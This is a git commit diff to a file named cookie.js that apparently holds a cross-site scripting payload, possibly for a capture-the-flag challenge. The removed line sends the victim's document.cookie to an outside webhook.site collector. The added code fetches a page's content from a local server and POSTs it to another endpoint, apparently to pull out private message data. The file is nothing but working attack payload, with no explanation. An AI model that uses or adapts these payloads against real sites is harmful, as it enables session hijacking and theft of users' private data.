5736f82042f1ea33a7635b1134ee8d5a84d01a77
Twil4 <116651808+Twil4@users.noreply.github.com>
2024-05-23 16:34:25 +0700

    Update cookie.js

--- cookie.js
+++ cookie.js
@@ -1,1 +1,11 @@
-fetch('https://webhook.site/6ec2ce5d-39a2-42f0-90da-c2b79029af7f?c=' + document.cookie)
+fetch("http://127.0.0.1/message/3").then((r) => {
+    return r.text();
+}).then((x) => {
+    fetch("http://127.0.0.1/submit", {
+        "headers": {
+            "content-type": "application/json"
+        },
+        "body": x,
+        "method": "POST"
+    });
+});
